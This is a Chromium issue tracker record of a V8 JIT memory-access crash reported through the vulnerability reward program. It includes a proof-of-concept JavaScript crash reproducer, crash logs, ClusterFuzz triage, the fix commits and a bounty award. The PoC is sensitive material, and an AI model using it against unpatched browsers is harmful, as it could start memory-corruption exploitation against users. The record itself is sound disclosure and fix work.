# Security: SEGV_ACCERR in V8

| Field | Value |
|-------|-------|
| **Issue ID** | [353628445](https://issues.chromium.org/issues/353628445) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>API, Blink>JavaScript>Compiler>Turbofan, Blink>JavaScript>Runtime |
| **Platforms** | Linux |
| **Reporter** | ki...@gmail.com |
| **Assignee** | ni...@chromium.org |
| **Created** | 2024-07-17 |
| **Bounty** | $7,000.00 |

## Description

VULNERABILITY DETAILS

My other poc is able to crash at other addresses, I don't think it's a null pointer issue, its offset is much higher.

## INTRODUCE

After bisect, it was determined that following commit caused this problem.

- Commit Info
  - Version: 94866
  - link: <https://crrev.com/7857eb34db42f339b337c6bdfb0d10deb14862f3>
- Commit Message

```
commit 7857eb34db42f339b337c6bdfb0d10deb14862f3
Author: snek <snek@chromium.org>
Date:   Wed Jul 3 12:44:41 2024 -0700

    Reland^2 "Add ContinuationPreservedEmbedderData builtins to extras binding"
   
    This reverts commit cb1277e97a0ed32fd893be9f4e927f6e8b6c566c.
   
    > Original change's description:
    > > Add ContinuationPreservedEmbedderData builtins to extras binding
    > >
    > > Node.js and Deno wish to use CPED for AsyncLocalStorage and APM, which
    > > needs a high performance implementation. These builtins allow JavaScript
    > > to handle CPED performantly.
    > >
    > > Change-Id: I7577be80818524baa52791dfce57d442d7c0c933
    > > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5638129
    > > Commit-Queue: snek <snek@chromium.org>
    > > Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    > > Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    > > Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    > > Cr-Commit-Position: refs/heads/main@{#94607}
    >
    > Change-Id: Ief390f0b99891c8de83b4c794180440f91cbaf1f
    > No-Presubmit: true
    > No-Tree-Checks: true
    > No-Try: true
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5649024
    > Auto-Submit: Shu-yu Guo <syg@chromium.org>
    > Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    > Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    > Cr-Commit-Position: refs/heads/main@{#94608}
   
    Change-Id: I4943071ffe192084e83bfe3113cfe9c92ef31465
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5677045
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    Commit-Queue: snek <snek@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#94866}


```
## PoC

```
function main() {
  const {
    getExtrasBindingObject: v0,
    getContinuationPreservedEmbedderDataViaAPIForTesting: v1
  } = d8;
  const {
    getContinuationPreservedEmbedderData: v2,
    setContinuationPreservedEmbedderData: v3
  } = v0();
  function f0(v5) {
    try {
      v3(v5);
    } catch (e) {}
    return v2();
  }
  const v4 = v6 => {
    const v7 = (%PrepareFunctionForOptimization(f0), f0(v6), f0(v6), %OptimizeFunctionOnNextCall(f0), f0(v6));
    try {
      gc();
    } catch (e) {}
    try {
      v7();
    } catch (e) {}
  };
  try {
    v4({});
  } catch (e) {}
}
main();
main();
%OptimizeFunctionOnNextCall(main);
main();
//flags: --expose-gc --allow-natives-syntax --jit-fuzzing

```
## CRASH LOG

- Debug output

```
d8-linux-debug-cache/d8-linux-debug-v8-component-95071/d8 --expose-gc --allow-natives-syntax --jit-fuzzing  poc.js
Received signal 11 SEGV_ACCERR 0a95beadbef6

==== C stack trace ===============================

 [0x7f5edb5f4b03]
 [0x7f5edb5f4a52]
 [0x7f5edae42520]
 [0x7f5e5f443e90]
[end of stack trace]
[1]    1043570 segmentation fault  d8-linux-debug-cache/d8-linux-debug-v8-component-95071/d8 --expose-gc   poc.j

```
## Other

Please note to include the flags `--expose-gc --allow-natives-syntax --jit-fuzzing`  for clusterfuzz classification.

VERSION
Tested on v8 version: 12.8.0 - 12.8.0

REPRODUCTION CASE

1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-95071.zip
2. Run: `d8 --expose-gc --allow-natives-syntax --jit-fuzzing poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Zhenghang Xiao (@Kipreyyy)

## Timeline

### cl...@appspot.gserviceaccount.com (2024-07-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5184961118142464.

### dr...@chromium.org (2024-07-17)

[security triage] Uploaded to clusterfuzz, which will hopefully take care of the triage from here: <https://clusterfuzz.com/testcase-detail/5184961118142464>

### 24...@project.gserviceaccount.com (2024-07-17)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-07-17)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/33bbb52a289594f19e556cc9247edceb1f7d7da9 ([turboshaft] Add support for uncompressed pointer stores

Bug: v8:12783, chromium:351926098
Change-Id: Ib48a14766671262871a161b82b9be9626fe2f016
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5713788
Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
Reviewed-by: Thibaud Michaud <thibaudm@chromium.org>
Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
Cr-Commit-Position: refs/heads/main@{#95067}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2024-07-17)

Detailed Report: https://clusterfuzz.com/testcase?key=5184961118142464

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7eba0015ff55
Crash State:
  Builtins_Call_ReceiverIsNullOrUndefined
  Builtins_InterpreterEntryTrampoline
  Builtins_JSEntryTrampoline
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=95066:95067

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5184961118142464

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### pe...@google.com (2024-07-18)

Setting milestone because of s2 severity.

### pe...@google.com (2024-07-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### pe...@google.com (2024-07-18)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ki...@gmail.com (2024-07-24)

Hello, any update please?

### ap...@google.com (2024-07-25)

Project: v8/v8
Branch: main

commit ce29fae4e490735ff3dbd572f50f0cdc41a72447
Author: Nico Hartmann <nicohartmann@chromium.org>
Date:   Thu Jul 25 11:44:54 2024

    [turboshaft] Properly handle UncompressedTagged representations in ISel
    
    Bug: chromium:353628445, chromium:354626177, chromium:351926098
    Change-Id: I7afc7b2974cfc2344c1585aa8c9e161585d7bf90
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5735179
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#95266}

M       src/compiler/backend/arm64/instruction-selector-arm64.cc
M       src/compiler/backend/instruction-selector-adapter.h
M       src/compiler/backend/x64/instruction-selector-x64.cc
M       src/compiler/turboshaft/representations.cc
M       src/compiler/turboshaft/representations.h
M       test/mjsunit/mjsunit.status
A       test/mjsunit/regress/regress-353628445.js
A       test/mjsunit/regress/regress-354626177.js

https://chromium-review.googlesource.com/5735179


### ap...@google.com (2024-07-25)

Project: v8/v8
Branch: main

commit a98fec4bffe8ec59dc3d76999c73e217d8a7d41b
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Thu Jul 25 12:52:48 2024

    [arm64] ISel: Fix non-pointer-compression for crrev.com/c/5735179
    
    No-Presubmit: true
    No-Tree-Checks: true
    No-Try: true
    Bug: chromium:353628445, chromium:354626177, chromium:351926098
    Change-Id: I24432ff639c1d4abb593980c0ae2c5089002ba35
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5741335
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#95267}

M       src/compiler/backend/arm64/instruction-selector-arm64.cc

https://chromium-review.googlesource.com/5741335


### 24...@project.gserviceaccount.com (2024-07-25)

ClusterFuzz testcase 5184961118142464 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8&range=95265:95266

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### 24...@project.gserviceaccount.com (2024-07-25)

Detailed Report: https://clusterfuzz.com/testcase?key=5184961118142464

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7eba0015ff55
Crash State:
  Builtins_Call_ReceiverIsNullOrUndefined
  Builtins_InterpreterEntryTrampoline
  Builtins_JSEntryTrampoline
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=95066:95067
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=95265:95266

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5184961118142464

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### pe...@google.com (2024-07-25)

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M128. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### ni...@chromium.org (2024-07-26)

Please answer the following questions so that we can safely process this merge request:

1. <https://chromium-review.googlesource.com/c/v8/v8/+/5735179> together with <https://chromium-review.googlesource.com/c/v8/v8/+/5741335>
2. We have not seen any stability regressions so far.
3. No
4. No
5. No

### ap...@google.com (2024-07-26)

Project: v8/v8
Branch: main

commit c353c46b8c20b227e8c72bb76fbfb123e82c31e5
Author: Milad Fa <mfarazma@redhat.com>
Date:   Fri Jul 26 11:26:34 2024

    PPC/S390x:[turboshaft] Properly handle UncompressedTagged
    
    Port: ce29fae4e490735ff3dbd572f50f0cdc41a72447
    
    Bug: chromium:353628445, chromium:354626177, chromium:351926098
    Change-Id: If63042c9bbd6b7abf2912f25d055ddb6f21e98f4
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5740143
    Reviewed-by: Junliang Yan <junyan@redhat.com>
    Commit-Queue: Milad Farazmand <mfarazma@redhat.com>
    Cr-Commit-Position: refs/heads/main@{#95317}

M       src/compiler/backend/ppc/instruction-selector-ppc.cc
M       src/compiler/backend/s390/instruction-selector-s390.cc

https://chromium-review.googlesource.com/5740143


### am...@chromium.org (2024-07-26)

Since these are not trivial changes, are were just merged, letting this get bake time over the weekend and will revisit for merge review early next week.

### am...@chromium.org (2024-07-29)

<https://chromium-review.googlesource.com/c/v8/v8/+/5735179> and <https://chromium-review.googlesource.com/c/v8/v8/+/5741335> approved for merge to M128; please merge this fix to 12.8 at soonest so this fix can be included in the next update of M128 beta -- thanks!

### sp...@google.com (2024-07-31)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process / renderer 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-07-31)

Congratulations Zhenghang! Thank you for your efforts and reporting this issue to us.

### ap...@google.com (2024-08-02)

Project: v8/v8
Branch: refs/branch-heads/12.8

commit 325a82fad65c60ec232590420449c8764b73ce4f
Author: Nico Hartmann <nicohartmann@chromium.org>
Date:   Thu Jul 25 11:44:54 2024

    Merged: [turboshaft] Properly handle UncompressedTagged representations in ISel
    
    Bug: chromium:353628445, chromium:354626177, chromium:351926098
    (cherry picked from commit ce29fae4e490735ff3dbd572f50f0cdc41a72447)
    
    Change-Id: I7d9132d5df484ce158cb876a40893be4caf9fda0
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5756845
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.8@{#8}
    Cr-Branched-From: 70cbb397b153166027e34c75adf8e7993858222e-refs/heads/12.8.374@{#1}
    Cr-Branched-From: 451b63ed4251c2b21c56144d8428f8be3331539b-refs/heads/main@{#95151}

M       src/compiler/backend/arm64/instruction-selector-arm64.cc
M       src/compiler/backend/instruction-selector-adapter.h
M       src/compiler/backend/x64/instruction-selector-x64.cc
M       src/compiler/turboshaft/representations.cc
M       src/compiler/turboshaft/representations.h
M       test/mjsunit/mjsunit.status
A       test/mjsunit/regress/regress-353628445.js
A       test/mjsunit/regress/regress-354626177.js

https://chromium-review.googlesource.com/5756845


### ap...@google.com (2024-08-02)

Project: v8/v8
Branch: refs/branch-heads/12.8

commit 1d50920e68ad969af0006a9b882c6a0ffa953288
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Thu Jul 25 12:52:48 2024

    Merged: [arm64] ISel: Fix non-pointer-compression for crrev.com/c/5735179
    
    Bug: chromium:353628445, chromium:354626177, chromium:351926098
    (cherry picked from commit a98fec4bffe8ec59dc3d76999c73e217d8a7d41b)
    
    Change-Id: Ibbd3d60388ca79ba398951d0b2033befa0e8c859
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5756764
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.8@{#10}
    Cr-Branched-From: 70cbb397b153166027e34c75adf8e7993858222e-refs/heads/12.8.374@{#1}
    Cr-Branched-From: 451b63ed4251c2b21c56144d8428f8be3331539b-refs/heads/main@{#95151}

M       src/compiler/backend/arm64/instruction-selector-arm64.cc

https://chromium-review.googlesource.com/5756764


### pe...@google.com (2024-08-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2024-11-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/353628445)*
